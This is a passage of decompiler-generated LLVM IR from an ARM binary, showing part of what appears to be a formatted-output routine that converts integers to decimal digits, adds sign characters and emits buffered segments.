  %tmp215 = icmp slt i32 %v0_146b8, 1
  br i1 %tmp215, label %dec_label_pc_146c4, label %dec_label_pc_146b4

dec_label_pc_146b4:                               ; preds = %bb214
  %v2_146b8 = sub i32 %v2_14614, %v0_146b8
  store i32 %v2_146b8, i32* %r1.global-to-local, align 4
  %v2_146bc = add i32 %v5_14600, %v0_146b8
  store i32 %v2_146bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_146c4

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146b4, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_146b4 ]
  %v0_146d882 = phi i32 [ %v2_14614, %bb214 ], [ 0, %.thread129 ], [ %v2_146b8, %dec_label_pc_146b4 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_146c8

dec_label_pc_146c8:                               ; preds = %.thread127, %dec_label_pc_1464c, %dec_label_pc_146c4
  %v1_146f8 = phi i32 [ %v2_14658, %dec_label_pc_1464c ], [ %storemerge141, %dec_label_pc_146c4 ], [ %v5_14618, %.thread127 ]
  %v0_1471090 = phi i32 [ -1, %dec_label_pc_1464c ], [ -1, %dec_label_pc_146c4 ], [ %v0_146b8, %.thread127 ]
  %v0_146d8 = phi i32 [ 0, %dec_label_pc_1464c ], [ %v0_146d882, %dec_label_pc_146c4 ], [ %v2_14614, %.thread127 ]
  %v0_146c8 = load i32, i32* %fp.global-to-local, align 4
  %v1_146c8 = add i32 %v0_146c8, 12
  %v2_146c8 = inttoptr i32 %v1_146c8 to i32*
  %v3_146c8 = load i32, i32* %v2_146c8, align 4
  %v1_146cc = and i32 %v3_146c8, 16
  store i32 %v1_146cc, i32* %lr.global-to-local, align 4
  %v2_146cc = icmp eq i32 %v1_146cc, 0
  %tmp238 = zext i1 %v2_146cc to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_146d8 = icmp slt i32 %v0_146d8, 0
  store i1 %v1_146d8, i1* %cpsr_n.global-to-local, align 1
  %v2_146d8 = icmp eq i32 %v0_146d8, 0
  store i1 %v2_146d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146d8, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_146c8
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_146f4

bb218:                                            ; preds = %dec_label_pc_146c8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_146cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146cc, label %dec_label_pc_146e8, label %dec_label_pc_146f4

dec_label_pc_146e8:                               ; preds = %bb218
  %v0_146e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_146e8 = add i32 %v0_146e8, -103
  %v3_146e8 = sub i32 102, %v0_146e8
  %v4_146e8 = and i32 %v3_146e8, %v0_146e8
  %v5_146e8 = icmp slt i32 %v4_146e8, 0
  store i1 %v5_146e8, i1* %cpsr_v.global-to-local, align 1
  %v6_146e8 = icmp slt i32 %v1_146e8, 0
  store i1 %v6_146e8, i1* %cpsr_n.global-to-local, align 1
  %v7_146e8 = icmp eq i32 %v0_146e8, 103
  store i1 %v7_146e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_146e8, label %dec_label_pc_14710, label %bb219

bb219:                                            ; preds = %dec_label_pc_146e8
  %v1_146ec = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_146ec = icmp slt i32 %v1_146ec, 0
  store i1 %v2_146ec, i1* %cpsr_n.global-to-local, align 1
  %v3_146ec = icmp eq i32 %v1_146ec, 0
  store i1 %v3_146ec, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_146ec, 1
  br i1 %tmp220, label %dec_label_pc_14710, label %dec_label_pc_146f4

dec_label_pc_146f4:                               ; preds = %.thread33, %bb218, %bb219
  %v2_146f8 = inttoptr i32 %v1_146f8 to i32*
  store i32 112, i32* %v2_146f8, align 4
  %v1_14700 = load i32, i32* %r6.global-to-local, align 4
  %v2_14700 = add i32 %v1_14700, 4
  %v3_14700 = inttoptr i32 %v2_14700 to i32*
  store i32 1, i32* %v3_14700, align 4
  store i32 ptrtoint (i32* @global_var_1a24c.570 to i32), i32* %r3.global-to-local, align 4
  %v1_14708 = load i32, i32* %r6.global-to-local, align 4
  %v2_14708 = add i32 %v1_14708, 8
  %v3_14708 = inttoptr i32 %v2_14708 to i32*
  store i32 ptrtoint (i32* @global_var_1a24c.570 to i32), i32* %v3_14708, align 4
  %v0_1470c = load i32, i32* %r6.global-to-local, align 4
  %v1_1470c = add i32 %v0_1470c, 12
  store i32 %v1_1470c, i32* %r6.global-to-local, align 4
  %v0_14710.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14710

dec_label_pc_14710:                               ; preds = %dec_label_pc_146e8, %bb219, %dec_label_pc_146f4
  %v1_1471c = phi i32 [ %v1_146f8, %bb219 ], [ %v1_1470c, %dec_label_pc_146f4 ], [ %v1_146f8, %dec_label_pc_146e8 ]
  %v0_14710 = phi i32 [ %v0_1471090, %bb219 ], [ %v0_14710.pre, %dec_label_pc_146f4 ], [ %v0_1471090, %dec_label_pc_146e8 ]
  %v1_14710 = add i32 %v0_14710, 1
  store i32 %v1_14710, i32* %ip.global-to-local, align 4
  %v3_14710 = sub i32 0, %v0_14710
  %v4_14710 = and i32 %v1_14710, %v3_14710
  %v5_14710 = icmp slt i32 %v4_14710, 0
  store i1 %v5_14710, i1* %cpsr_v.global-to-local, align 1
  %v6_14710 = icmp slt i32 %v1_14710, 0
  store i1 %v6_14710, i1* %cpsr_n.global-to-local, align 1
  %v7_14710 = icmp eq i32 %v1_14710, 0
  store i1 %v7_14710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14710, label %dec_label_pc_14734, label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %dec_label_pc_14710
  %v1_14718 = sub i32 -1, %v0_14710
  %v2_1471c = add i32 %v1_1471c, 4
  %v3_1471c = inttoptr i32 %v2_1471c to i32*
  store i32 %v1_14718, i32* %v3_1471c, align 4
  store i32 ptrtoint (i32* @global_var_1a23f.568 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14728 = load i32, i32* %r6.global-to-local, align 4
  %v2_14728 = inttoptr i32 %v1_14728 to i32*
  store i32 176, i32* %v2_14728, align 4
  %v0_1472c = load i32, i32* %r3.global-to-local, align 4
  %v1_1472c = load i32, i32* %r6.global-to-local, align 4
  %v2_1472c = add i32 %v1_1472c, 8
  %v3_1472c = inttoptr i32 %v2_1472c to i32*
  store i32 %v0_1472c, i32* %v3_1472c, align 4
  %v0_14730 = load i32, i32* %r6.global-to-local, align 4
  %v1_14730 = add i32 %v0_14730, 12
  store i32 %v1_14730, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14734

dec_label_pc_14734:                               ; preds = %dec_label_pc_14710, %dec_label_pc_14718
  %v2_1473c = phi i32 [ %v1_1471c, %dec_label_pc_14710 ], [ %v1_14730, %dec_label_pc_14718 ]
  %v0_14734 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14734 = icmp slt i32 %v0_14734, 0
  store i1 %v1_14734, i1* %cpsr_n.global-to-local, align 1
  %v2_14734 = icmp eq i32 %v0_14734, 0
  store i1 %v2_14734, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14734, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_14734
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1473c = inttoptr i32 %v2_1473c to i32*
  store i32 112, i32* %v3_1473c, align 4
  %v1_14740 = load i32, i32* %r4.global-to-local, align 4
  %v2_14740 = load i32, i32* %r6.global-to-local, align 4
  %v3_14740 = add i32 %v2_14740, 8
  %v4_14740 = inttoptr i32 %v3_14740 to i32*
  store i32 %v1_14740, i32* %v4_14740, align 4
  %v1_14744 = load i32, i32* %r1.global-to-local, align 4
  %v2_14744 = load i32, i32* %r6.global-to-local, align 4
  %v3_14744 = add i32 %v2_14744, 4
  %v4_14744 = inttoptr i32 %v3_14744 to i32*
  store i32 %v1_14744, i32* %v4_14744, align 4
  %v1_14748 = load i32, i32* %r6.global-to-local, align 4
  %v2_14748 = add i32 %v1_14748, 12
  store i32 %v2_14748, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_14734, %bb221
  %v1_1476c = phi i32 [ %v2_1473c, %dec_label_pc_14734 ], [ %v2_14748, %bb221 ]
  %v0_1474c = load i32, i32* %r7.global-to-local, align 4
  %v1_1474c = add i32 %v0_1474c, -103
  %v3_1474c = sub i32 102, %v0_1474c
  %v4_1474c = and i32 %v3_1474c, %v0_1474c
  %v5_1474c = icmp slt i32 %v4_1474c, 0
  store i1 %v5_1474c, i1* %cpsr_v.global-to-local, align 1
  %v6_1474c = icmp slt i32 %v1_1474c, 0
  store i1 %v6_1474c, i1* %cpsr_n.global-to-local, align 1
  %v7_1474c = icmp eq i32 %v0_1474c, 103
  store i1 %v7_1474c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1474c, label %dec_label_pc_14754, label %dec_label_pc_1475c

dec_label_pc_14754:                               ; preds = %.thread42
  %v0_14754 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14754 = icmp slt i32 %v0_14754, 0
  store i1 %v1_14754, i1* %cpsr_n.global-to-local, align 1
  %v2_14754 = icmp eq i32 %v0_14754, 0
  store i1 %v2_14754, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14754, label %dec_label_pc_14784, label %dec_label_pc_1475c

dec_label_pc_1475c:                               ; preds = %.thread42, %dec_label_pc_14754
  %v0_1475c = load i32, i32* %ip.global-to-local, align 4
  %v1_1475c = load i32, i32* %r1.global-to-local, align 4
  %v2_1475c = sub i32 %v1_1475c, %v0_1475c
  store i32 %v2_1475c, i32* %r3.global-to-local, align 4
  %v1_14760 = load i32, i32* %r8.global-to-local, align 4
  %v2_14760 = sub i32 %v2_1475c, %v1_14760
  %v4_14760 = xor i32 %v1_14760, %v2_1475c
  %v5_14760 = xor i32 %v2_14760, %v2_1475c
  %v6_14760 = and i32 %v5_14760, %v4_14760
  %v7_14760 = icmp slt i32 %v6_14760, 0
  store i1 %v7_14760, i1* %cpsr_v.global-to-local, align 1
  %v8_14760 = icmp slt i32 %v2_14760, 0
  store i1 %v8_14760, i1* %cpsr_n.global-to-local, align 1
  %v9_14760 = icmp eq i32 %v2_1475c, %v1_14760
  store i1 %v9_14760, i1* %cpsr_z.global-to-local, align 1
  %v2_14764 = xor i1 %v8_14760, %v7_14760
  br i1 %v2_14764, label %dec_label_pc_14768, label %dec_label_pc_14784

dec_label_pc_14768:                               ; preds = %dec_label_pc_1475c
  %v2_14768 = sub i32 %v1_14760, %v2_1475c
  %v2_1476c = add i32 %v1_1476c, 4
  %v3_1476c = inttoptr i32 %v2_1476c to i32*
  store i32 %v2_14768, i32* %v3_1476c, align 4
  store i32 ptrtoint (i32* @global_var_1a23f.568 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14778 = load i32, i32* %r6.global-to-local, align 4
  %v2_14778 = inttoptr i32 %v1_14778 to i32*
  store i32 176, i32* %v2_14778, align 4
  %v0_1477c = load i32, i32* %r3.global-to-local, align 4
  %v1_1477c = load i32, i32* %r6.global-to-local, align 4
  %v2_1477c = add i32 %v1_1477c, 8
  %v3_1477c = inttoptr i32 %v2_1477c to i32*
  store i32 %v0_1477c, i32* %v3_1477c, align 4
  %v0_14780 = load i32, i32* %r6.global-to-local, align 4
  %v1_14780 = add i32 %v0_14780, 12
  store i32 %v1_14780, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14784

dec_label_pc_14784:                               ; preds = %dec_label_pc_1475c, %dec_label_pc_14754, %dec_label_pc_14768
  %v1_14818.pre.pre = phi i32 [ %v1_1476c, %dec_label_pc_1475c ], [ %v1_1476c, %dec_label_pc_14754 ], [ %v1_14780, %dec_label_pc_14768 ]
  %v0_14784 = load i32, i32* %sl.global-to-local, align 4
  %v1_14784 = add i32 %v0_14784, -102
  %v3_14784 = sub i32 101, %v0_14784
  %v4_14784 = and i32 %v3_14784, %v0_14784
  %v5_14784 = icmp slt i32 %v4_14784, 0
  store i1 %v5_14784, i1* %cpsr_v.global-to-local, align 1
  %v6_14784 = icmp slt i32 %v1_14784, 0
  store i1 %v6_14784, i1* %cpsr_n.global-to-local, align 1
  %v7_14784 = icmp eq i32 %v0_14784, 102
  store i1 %v7_14784, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14784, label %dec_label_pc_1480c, label %dec_label_pc_1478c

dec_label_pc_1478c:                               ; preds = %dec_label_pc_14784
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14790 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14790 = icmp slt i32 %v0_14790, 0
  store i1 %v1_14790, i1* %cpsr_n.global-to-local, align 1
  %v2_14790 = icmp eq i32 %v0_14790, 0
  store i1 %v2_14790, i1* %cpsr_z.global-to-local, align 1
  %v4_14794 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_14794, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_147a4 = sub i32 0, %v0_14790
  %storemerge140 = select i1 %v1_14790, i32 %v4_147a4, i32 %v0_14790
  %tmp239 = ashr i32 %v0_14790, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_147ac = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_147ac, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_147b4

dec_label_pc_147b4:                               ; preds = %dec_label_pc_147e4, %dec_label_pc_147b4, %dec_label_pc_1478c
  %v2_147cc = phi i32 [ %v2_147ac, %dec_label_pc_1478c ], [ %v6_147cc, %dec_label_pc_147b4 ], [ %v6_147cc, %dec_label_pc_147e4 ]
  %v0_147c8 = phi i32 [ %storemerge140, %dec_label_pc_1478c ], [ %v2_147d0, %dec_label_pc_147b4 ], [ %v2_147d0, %dec_label_pc_147e4 ]
  %v2_147bc = srem i32 %v0_147c8, 10
  %v1_147c0 = add nsw i32 %v2_147bc, 48
  store i32 %v1_147c0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_147c8, i32* %r0.global-to-local, align 4
  %v1_147cc = trunc i32 %v1_147c0 to i8
  %v3_147cc = add i32 %v2_147cc, -1
  %v4_147cc = inttoptr i32 %v3_147cc to i8*
  store i8 %v1_147cc, i8* %v4_147cc, align 1
  %v5_147cc = load i32, i32* %r5.global-to-local, align 4
  %v6_147cc = add i32 %v5_147cc, -1
  store i32 %v6_147cc, i32* %r5.global-to-local, align 4
  %v0_147d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_147d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_147d0 = sdiv i32 %v0_147d0, %v1_147d0
  store i32 %v2_147d0, i32* %r0.global-to-local, align 4
  %v0_147d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_147d4 = add i32 %v0_147d4, 1
  store i32 %v1_147d4, i32* %r7.global-to-local, align 4
  %v1_147d8 = add i32 %v0_147d4, -2
  %v3_147d8 = sub i32 1, %v0_147d4
  %v4_147d8 = and i32 %v3_147d8, %v1_147d4
  %v5_147d8 = icmp slt i32 %v4_147d8, 0
  store i1 %v5_147d8, i1* %cpsr_v.global-to-local, align 1
  %v6_147d8 = icmp slt i32 %v1_147d8, 0
  store i1 %v6_147d8, i1* %cpsr_n.global-to-local, align 1
  %v7_147d8 = icmp eq i32 %v1_147d4, 3
  store i1 %v7_147d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_147d0, i32* %r4.global-to-local, align 4
  %v7_147e0 = icmp slt i32 %v1_147d4, 4
  br i1 %v7_147e0, label %dec_label_pc_147b4, label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147b4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_147e4 = icmp slt i32 %v2_147d0, 0
  store i1 %v1_147e4, i1* %cpsr_n.global-to-local, align 1
  %v2_147e4 = icmp eq i32 %v2_147d0, 0
  store i1 %v2_147e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147e4, label %dec_label_pc_147ec, label %dec_label_pc_147b4

dec_label_pc_147ec:                               ; preds = %dec_label_pc_147e4
  %v1_147ec = add i32 %v5_147cc, -2
  store i32 %v1_147ec, i32* %r3.global-to-local, align 4
  %v0_147f0 = load i32, i32* %sl.global-to-local, align 4
  %v1_147f0 = trunc i32 %v0_147f0 to i8
  %v4_147f0 = inttoptr i32 %v1_147ec to i8*
  store i8 %v1_147f0, i8* %v4_147f0, align 1
  %v0_147f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_147f4 = add i32 %v0_147f4, -1
  store i32 %v1_147f4, i32* %r2.global-to-local, align 4
  %v0_147f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_147f8 = trunc i32 %v0_147f8 to i8
  %v4_147f8 = inttoptr i32 %v1_147f4 to i8*
  store i8 %v1_147f8, i8* %v4_147f8, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_14800 = load i32, i32* %r6.global-to-local, align 4
  %v1_14800 = inttoptr i32 %v0_14800 to i32*
  store i32 112, i32* %v1_14800, align 4
  %v3_14800 = add i32 %v0_14800, 4
  %v4_14800 = inttoptr i32 %v3_14800 to i32*
  %v5_14800 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_14800, i32* %v4_14800, align 4
  %v0_14804 = load i32, i32* %r2.global-to-local, align 4
  %v1_14804 = load i32, i32* %r6.global-to-local, align 4
  %v2_14804 = add i32 %v1_14804, 8
  %v3_14804 = inttoptr i32 %v2_14804 to i32*
  store i32 %v0_14804, i32* %v3_14804, align 4
  %v0_14808 = load i32, i32* %r6.global-to-local, align 4
  %v1_14808 = add i32 %v0_14808, 12
  store i32 %v1_14808, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1480c

dec_label_pc_1480c:                               ; preds = %dec_label_pc_14784, %.thread105, %dec_label_pc_147ec
  %v1_14818.pre = phi i32 [ %v2_14384, %.thread105 ], [ %v1_14808, %dec_label_pc_147ec ], [ %v1_14818.pre.pre, %dec_label_pc_14784 ]
  %v2_1480c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1480c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14810

dec_label_pc_14810:                               ; preds = %dec_label_pc_14810, %dec_label_pc_1480c
  %v0_14810 = phi i32 [ %v2_1480c, %dec_label_pc_1480c ], [ %v4_14810, %dec_label_pc_14810 ]
  %stack_var_-188.0 = phi i32 [ %v3_142bc, %dec_label_pc_1480c ], [ %v2_1481c, %dec_label_pc_14810 ]
  %v1_14810 = inttoptr i32 %v0_14810 to i32*
  %v2_14810 = load i32, i32* %v1_14810, align 4
  store i32 %v2_14810, i32* %r3.global-to-local, align 4
  %v4_14810 = add i32 %v0_14810, 12
  store i32 %v4_14810, i32* %r2.global-to-local, align 4
  %v3_14818 = icmp ult i32 %v4_14810, %v1_14818.pre
  %v2_1481c = sub i32 %stack_var_-188.0, %v2_14810
  store i32 %v2_1481c, i32* %ip.global-to-local, align 4
  br i1 %v3_14818, label %dec_label_pc_14810, label %dec_label_pc_14828

dec_label_pc_14828:                               ; preds = %dec_label_pc_14810
  %v3_14828 = load i8, i8* %stack_var_-50, align 1
  %v4_14828 = sext i8 %v3_14828 to i32
  store i32 %v4_14828, i32* %r3.global-to-local, align 4
  store i32 %v4_14828, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1482c = icmp slt i8 %v3_14828, 0
  store i1 %v1_1482c, i1* %cpsr_n.global-to-local, align 1
  %v2_1482c = icmp eq i8 %v3_14828, 0
  store i1 %v2_1482c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1482c, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_14828
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_14828, %bb225
  %v1_14878 = phi i32 [ %v4_14828, %dec_label_pc_14828 ], [ 1, %bb225 ]
  %v2_14834 = sub i32 %v2_1481c, %v1_14878
  store i32 %v2_14834, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1483c = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_1483c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14840 = icmp slt i32 %v2_14834, 0
  store i1 %v1_14840, i1* %cpsr_n.global-to-local, align 1
  %v2_14840 = icmp eq i32 %v2_14834, 0
  store i1 %v2_14840, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_14834, 1
  br i1 %tmp227, label %dec_label_pc_148a0, label %dec_label_pc_14854

dec_label_pc_14854:                               ; preds = %bb226
  %v0_14854 = load i32, i32* %fp.global-to-local, align 4
  %v1_14854 = add i32 %v0_14854, 12
  %v2_14854 = inttoptr i32 %v1_14854 to i32*
  %v3_14854 = load i32, i32* %v2_14854, align 4
  store i32 %v3_14854, i32* %r3.global-to-local, align 4
  %v1_14858 = and i32 %v3_14854, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14858 = icmp eq i32 %v1_14858, 0
  store i1 %v2_14858, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14858, label %dec_label_pc_14870, label %dec_label_pc_14860

dec_label_pc_14860:                               ; preds = %dec_label_pc_14854
  store i32 ptrtoint (i32* @global_var_1a23f.568 to i32), i32* %r3.global-to-local, align 4
  %v1_14864 = add i32 %v1_14818.pre, 12
  store i32 %v1_14864, i32* %r5.global-to-local, align 4
  %v1_14868 = inttoptr i32 %v1_14818.pre to i32*
  store i32 160, i32* %v1_14868, align 4
  %v3_14868 = add i32 %v1_14818.pre, 4
  %v4_14868 = inttoptr i32 %v3_14868 to i32*
  %v5_14868 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14868, i32* %v4_14868, align 4
  %v6_14868 = add i32 %v1_14818.pre, 8
  %v7_14868 = inttoptr i32 %v6_14868 to i32*
  %v8_14868 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_14868, i32* %v7_14868, align 4
  br label %dec_label_pc_148a4

dec_label_pc_14870:                               ; preds = %dec_label_pc_14854
  %v1_14870 = add i32 %v0_14854, 16
  %v2_14870 = inttoptr i32 %v1_14870 to i32*
  %v3_14870 = load i32, i32* %v2_14870, align 4
  store i32 %v3_14870, i32* %r3.global-to-local, align 4
  %v1_14874 = add i32 %v3_14870, -48
  %v3_14874 = sub i32 47, %v3_14870
  %v4_14874 = and i32 %v3_14874, %v3_14870
  %v5_14874 = icmp slt i32 %v4_14874, 0
  store i1 %v5_14874, i1* %cpsr_v.global-to-local, align 1
  %v6_14874 = icmp slt i32 %v1_14874, 0
  store i1 %v6_14874, i1* %cpsr_n.global-to-local, align 1
  %v7_14874 = icmp eq i32 %v3_14870, 48
  store i1 %v7_14874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14874, label %dec_label_pc_14884, label %bb228

bb228:                                            ; preds = %dec_label_pc_14870
  store i32 %v2_1481c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_148a0

dec_label_pc_14884:                               ; preds = %dec_label_pc_14870
  %v3_14884 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_14818.pre, i32* %r5.global-to-local, align 4
  %v2_1488c = add i32 %v3_14884, %v2_14834
  store i32 %v2_1488c, i32* %r3.global-to-local, align 4
  store i32 %v2_1488c, i32* %stack_var_-168, align 4
  br label %dec_label_pc_148a4

dec_label_pc_14898:                               ; preds = %dec_label_pc_148ac
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_148dc

dec_label_pc_148a0:                               ; preds = %bb228, %bb226
  store i32 %v1_14818.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %dec_label_pc_14884, %dec_label_pc_14860, %dec_label_pc_148a0
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_14298, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_148ac

dec_label_pc_148ac:                               ; preds = %dec_label_pc_148d4, %dec_label_pc_148a4
  %v0_148ac = phi i32 [ %v1_148cc, %dec_label_pc_148d4 ], [ %v2_14298, %dec_label_pc_148a4 ]
  %v1_148ac = inttoptr i32 %v0_148ac to i32*
  %v2_148ac = load i32, i32* %v1_148ac, align 4
  store i32 %v2_148ac, i32* %r1.global-to-local, align 4
  %v3_148ac = add i32 %v0_148ac, 4
  %v4_148ac = inttoptr i32 %v3_148ac to i32*
  %v5_148ac = load i32, i32* %v4_148ac, align 4
  store i32 %v5_148ac, i32* %r2.global-to-local, align 4
  %v6_148ac = add i32 %v0_148ac, 8
  %v7_148ac = inttoptr i32 %v6_148ac to i32*
  %v8_148ac = load i32, i32* %v7_148ac, align 4
  store i32 %v8_148ac, i32* %r3.global-to-local, align 4
  %v2_148b0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_148b0, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 84160, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_148c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_148c0 = add i32 %v0_148c0, 4
  %v2_148c0 = inttoptr i32 %v1_148c0 to i32*
  %v3_148c0 = load i32, i32* %v2_148c0, align 4
  store i32 %v3_148c0, i32* %r3.global-to-local, align 4
  %v0_148c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_148c4 = sub i32 %v0_148c4, %v3_148c0
  %v4_148c4 = xor i32 %v0_148c4, %v3_148c0
  %v5_148c4 = xor i32 %v2_148c4, %v0_148c4
  %v6_148c4 = and i32 %v5_148c4, %v4_148c4
  %v7_148c4 = icmp slt i32 %v6_148c4, 0
  store i1 %v7_148c4, i1* %cpsr_v.global-to-local, align 1
  %v8_148c4 = icmp slt i32 %v2_148c4, 0
  store i1 %v8_148c4, i1* %cpsr_n.global-to-local, align 1
  %v9_148c4 = icmp eq i32 %v0_148c4, %v3_148c0
  store i1 %v9_148c4, i1* %cpsr_z.global-to-local, align 1
  %v0_148c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_148c8 = add i32 %v0_148c8, %v0_148c4
  store i32 %v2_148c8, i32* %r6.global-to-local, align 4
  %v1_148cc = add i32 %v0_148c0, 12
  store i32 %v1_148cc, i32* %r4.global-to-local, align 4
  br i1 %v9_148c4, label %dec_label_pc_148d4, label %dec_label_pc_14898

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148ac
  %v1_148d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_148d4 = sub i32 %v1_148cc, %v1_148d4
  %v3_148d4 = icmp ult i32 %v1_148cc, %v1_148d4
  %v4_148d4 = xor i32 %v1_148d4, %v1_148cc
  %v5_148d4 = xor i32 %v2_148d4, %v1_148cc
  %v6_148d4 = and i32 %v5_148d4, %v4_148d4
  %v7_148d4 = icmp slt i32 %v6_148d4, 0
  store i1 %v7_148d4, i1* %cpsr_v.global-to-local, align 1
  %v8_148d4 = icmp slt i32 %v2_148d4, 0
  store i1 %v8_148d4, i1* %cpsr_n.global-to-local, align 1
  %v9_148d4 = icmp eq i32 %v1_148cc, %v1_148d4
  store i1 %v9_148d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_148d4, label %dec_label_pc_148ac, label %dec_label_pc_148dc

dec_label_pc_148dc:                               ; preds = %dec_label_pc_148d4, %dec_label_pc_14898
  %v0_148dc = phi i32 [ -1, %dec_label_pc_14898 ], [ %v2_148c8, %dec_label_pc_148d4 ]
  store i32 %v0_148dc, i32* %r0.global-to-local, align 4
  %v8_148e8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_148e8, i32* @r6, align 4
  store i32 %v6_14284, i32* @r7, align 4
  store i32 %v9_14284, i32* @r8, align 4
  store i32 %v12_14284, i32* @sb, align 4
  store i32 %v15_14284, i32* @sl, align 4
  store i32 %v18_14284, i32* @fp, align 4
  ret i32 %v0_148dc

; uselistorder directives
  uselistorder i32 %v0_148dc, { 1, 0 }
  uselistorder i32 %v2_148d4, { 1, 0 }
  uselistorder i32 %v1_148d4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_148cc, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_148c4, { 1, 0 }
  uselistorder i32 %v0_148c4, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_148c0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_148ac, { 2, 1, 0 }
